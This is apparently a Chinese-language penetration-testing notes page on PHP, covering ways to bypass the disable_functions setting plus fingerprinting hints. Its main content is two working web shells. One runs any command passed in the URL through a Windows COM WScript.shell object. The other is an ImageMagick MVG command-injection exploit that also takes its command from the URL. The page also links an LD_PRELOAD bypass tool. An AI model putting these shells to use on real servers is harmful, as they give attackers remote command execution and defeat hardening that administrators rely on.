## 组件简介

php是最好的语言？

## 漏洞列表

| 漏洞名称 | 漏洞ID | 影响版本 | CVSS |
| -------- | ------ | -------- | ---- |
|          |        |          |      |

### disable_function绕过

1. window com组件

``` php
<?php
$command=$_GET['a'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

2. 利用ImageMagick组件(phpinfo查看)漏洞绕过disable_function

ImageMagick(https://imagemagick.org)是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件

``` php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;
file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

3. 利用环境变量LD_PRELOAD来绕过

通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。

https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

## 组件指纹

1. 查看文件后缀
2. header头部
3. cookie:phpsession
